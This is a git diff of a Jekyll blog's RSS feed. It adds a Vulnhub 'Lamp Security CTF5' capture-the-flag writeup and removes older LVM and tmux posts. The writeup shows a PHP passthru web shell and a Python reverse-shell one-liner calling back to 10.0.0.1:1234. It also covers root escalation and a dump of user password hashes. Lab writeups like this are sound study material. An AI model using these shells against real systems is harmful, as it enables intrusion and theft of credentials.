@@ -5,9 +5,122 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sun, 07 Jan 2018 21:32:48 +0100</pubDate>
-    <lastBuildDate>Sun, 07 Jan 2018 21:32:48 +0100</lastBuildDate>
+    <pubDate>Sun, 07 Jan 2018 21:54:23 +0100</pubDate>
+    <lastBuildDate>Sun, 07 Jan 2018 21:54:23 +0100</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Lamp Security CTF5 Writeup</title>
+        <description>&lt;p&gt;LAMP security CTF5 is a funny and easy CTF with a lot of vulnerabilities. You can find info about it on &lt;a href=&quot;https://vulnhub.com&quot;&gt;Vulnhub.com&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I ran nmap to see which services were open:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf04.root-me.org
+Password:
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-13 22:39 CEST
+Nmap scan report for ctf04.root-me.org (212.129.29.186)
+Host is up (0.078s latency).
+Not shown: 990 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)
+25/tcp   open  smtp        Sendmail 8.14.1/8.14.1
+80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))
+110/tcp  open  pop3        ipop3d 2006k.101
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: MYGROUP)
+143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)
+445/tcp  open  netbios-ssn Samba smbd 3.X – 4.X (workgroup: MYGROUP)
+901/tcp  open  http        Samba SWAT administration server
+3306/tcp open  mysql       MySQL 5.0.45
+Device type: WAP|general purpose|media device|broadband router|PBX
+Running (JUST GUESSING): Linux 2.4.X|2.6.X (95%), Sony embedded (95%), Starbridge Networks embedded (95%), Asus embedded (94%), Cisco embedded (94%)
+OS CPE: cpe:/o:linux:linux_kernel:2.4.30 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:sony:smp-n200 cpe:/o:linux:linux_kernel:2.6 cpe:/h:starbridge_networks:1531 cpe:/h:asus:rt-ac66u cpe:/h:asus:rt-n16 cpe:/h:cisco:uc320
+Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (95%), Linux 2.6.27 (95%), Linux 2.6.9 – 2.6.27 (95%), Sony SMP-N200 media player (95%), Linux 2.6.21 (95%), Starbridge Networks 1531 wireless ASDL modem (95%), Linux 2.6.18 (95%), Tomato 1.28 (Linux 2.6.22) (95%), Asus RT-AC66U router (Linux 2.6) (94%), Asus RT-N16 WAP (Linux 2.6) (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 15 hops
+Service Info: Hosts: localhost.localdomain, 10.66.4.100; OS: Unix
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;How we can see there were a lot of services, but first let’s see the website on port 80. I found a Local File Inclusion (LFI) Vulnerability:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: include_once(inc/pagina.php.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
+
+Warning: include_once() [function.include]: Failed opening ‘inc/pagina.php.php’ for inclusion (include_path=’.:/usr/share/pear:/usr/share/php’) in /var/www/html/index.php on line 6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The warning “include_once(inc/pagina.php.php)” helped me to understand I needed a null byte:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, I found a LFI but i needed to upload something for run code. On blog page there was this NanoCMS:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I found this &lt;a href=&quot;http://www.securityfocus.com/bid/34508&quot;&gt;vulnerability&lt;/a&gt; for NanoCMS (DirBuster found the same file):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok I got the username and password hash:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Authentication was successful, I created a new page containing a classic “&lt;?php passthru($_GET[“cmd”]); ?&gt;”:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After some local enumeration, I discovered that the OS was vulnerable to this &lt;a href=&quot;http://www.exploit-db.com/exploits/9479/&quot;&gt;exploit&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2# id
+id
+uid=0(root) gid=0(root) groups=48(apache) context=system_u:system_r:httpd_t:s0
+bash-3.2# cat /passwd
+cat /passwd
+237709daa3a06bde0355ff93a9de0ca9
+bash-3.2#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There were much interesting things in the system, for example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;samba users enumeration&lt;/li&gt;
+  &lt;li&gt;database credentials (LFI on configuration file of another blog)&lt;/li&gt;
+  &lt;li&gt;database content:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+—–+———-+————+———————————-+
+| uid | name | login | pass |
++—–+———-+————+———————————-+
+| 0 | | 0 | |
+| 1 | jennifer | 1241021410 | e3f4150c722e6376d87cd4d43fef0bc5 |
+| 2 | patrick | 1475888924 | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| 3 | andy | 1241021903 | b64406d23d480b88fe71755b96998a51 |
+| 4 | loren | 0 | 6c470dd4a0901d53f7ed677828b23cfd |
+| 5 | amy | 0 | e5f0f20b92f7022779015774e90ce917 |
++—–+———-+————+———————————-+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bye bye!!!&lt;/p&gt;
+</description>
+        <pubDate>Wed, 20 Dec 2017 22:30:00 +0100</pubDate>
+        <link>http://localhost:4000/blog/lamp-security-ctf5-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf5-writeup/</guid>
+        
+        <category>vulnhub</category>
+        
+        <category>root-me</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Lamp Security CTF4 Writeup</title>
@@ -118,96 +231,6 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
         <category>vulnhub</category>
         
         <category>root-me</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>Redimensionar partições LVM</title>
-        <description>&lt;p&gt;Em um post passado, mostrando como fazer a &lt;a href=&quot;blog/archlinux-lvm-luks/&quot;&gt;instalação do Arch Linux [0]&lt;/a&gt;, utilizei do LVM para gerenciar os discos. Lá falei um pouco mais da teoria por trás dele e tal. Aqui vou me ater mesmo a repassar o passo a passo utilizado para isso.&lt;/p&gt;
-
-&lt;p&gt;Uma questão a ser dita é que o LVM nos dá a possibilidade de poder redimensionar nossas partições sem desligar o sistema. Acontece que a depender de sua aplicação, mesmo que não dê um shutdown no sistema, as consequências podem ser as mesmas. Explico: para aumentar o tamanho da partição é moleza, dá para fazer sem mais nem menos. Agora para diminuir o volume de uma partição tem de desmontá-la e tudo mais. E isso para alguns pode ser um grande problema.&lt;/p&gt;
-
-&lt;p&gt;Mas enfim, vamos lá…&lt;/p&gt;
-
-&lt;h2 id=&quot;reduzir-o-tamanho&quot;&gt;Reduzir o tamanho&lt;/h2&gt;
-
-&lt;p&gt;Digamos que uma partição sua está sendo menos utilizada que outra e que você quer tirar um pouco de espaço dessa determinada partição e colocar na outra. Pois bem, não esqueça de adaptar os endereços aqui para seu cenário, uma breve explicação:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/particao&lt;/code&gt;: endereço no qual a partição que você está usando está montada&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;VolumeGroup&lt;/code&gt;: acredito que o nome já é autoexplicativo&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LogicalVolume01&lt;/code&gt; e &lt;code class=&quot;highlighter-rouge&quot;&gt;LogicalVolume02&lt;/code&gt;: os nomes também já se explicam, mas a numeração se refere a que o 01 é o volume lógico que irá diminuir de tamanho, enquanto o 02 o que irá aumentar&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;XXG&lt;/code&gt;: nova quantidade de gigas da partição que teve espaço diminuído&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Primeiro, desmonte a partição:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# umount /particao
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Então, repare o sistema de arquivos:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# fsck -f /dev/VolumeGroup/LogicalVolume01
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Agora de fato redimensione:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# resize2fs /dev/VolumeGroup/LogicalVolume01 XXG
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;E então, reduza o tamanho do volume lógico para seu novo espaço:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# lvreduce -L XXG /dev/VolumeGroup/LogicalVolume01
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Agora monte sua partição numa boa:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# mount /particao
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;aumentar-tamanho&quot;&gt;Aumentar tamanho&lt;/h2&gt;
-
-&lt;p&gt;Depois que passei por alguns apertos passei a deixar alguns gigas “sobrando” quando ia pensar no esquemas de partições, justamente por essa facilidade da adição em relação à redução. Pois bem, tendo em vista que já se tem o espaço sobrando, como o procedimento acima mostra como fazer, basta seguir:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# lvextend -L +10G /dev/mapper/main-root
-# resize2fs /dev/mapper/main-root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;E pronto. Agora cheque o tamanho dos discos com &lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt; e seja feliz! :)&lt;/p&gt;
-
-&lt;p&gt;Até!&lt;/p&gt;
-
-&lt;h2 id=&quot;links&quot;&gt;Links&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0]: http://localhost:4000blog/archlinux-lvm-luks/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-</description>
-        <pubDate>Tue, 11 Apr 2017 05:00:00 +0200</pubDate>
-        <link>http://localhost:4000/blog/redimensionar-particoes-lvm/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/redimensionar-particoes-lvm/</guid>
-        
-        <category>linux</category>
-        
-        <category>lvm</category>
-        
-        
-        <category>blog</category>
-        
-      </item>
-    
-      <item>
-        <title>Arch Linux + Tmux = CLI++</title>
-        <description>&lt;p&gt;prova&lt;/p&gt;
-</description>
-        <pubDate>Sun, 01 Jan 2017 13:00:00 +0100</pubDate>
-        <link>http://localhost:4000/blog/arch-linux-tmux/</link>
-        <guid isPermaLink="true">http://localhost:4000/blog/arch-linux-tmux/</guid>
-        
-        <category>test</category>
         
         
         <category>blog</category>
